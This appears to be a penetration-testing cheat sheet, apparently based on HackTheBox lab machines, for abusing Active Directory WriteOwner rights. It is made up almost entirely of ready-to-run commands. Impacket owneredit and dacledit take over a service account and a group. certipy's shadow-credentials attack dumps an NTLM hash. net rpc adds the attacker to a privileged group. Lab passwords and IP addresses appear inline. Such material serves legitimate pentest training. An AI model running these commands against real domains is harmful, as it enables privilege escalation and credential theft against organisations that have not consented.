
This ACL allows a user to change the owner of an Active Directory object.


---

## Write on Service Account

1. Becoming the owner of service account "ca_svc". Now user "ryan" (current user) owns this service account.

```
/usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

2. Giving GenericAll for "ryan" over "ca_svc".

```
/usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

3. Get NTLM Hash for user "ca_svc".

```
certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 
```

---
## Write on Group

1. Utilize impacket-owneredit to modify the owner of the AD Object (Management Group)

```
impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.129.231.186
```

2. Add rights to current user "judith.mader" to add users:

```
impacket-dacledit -action write -rights WriteMembers -principal judith.mader -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

3. Add judith.mader to the Management Group

```
net rpc group addmem Management judith.mader -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```

4. Verify if user judith.mader is inside the Management Group now:

```
net rpc group members Management -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```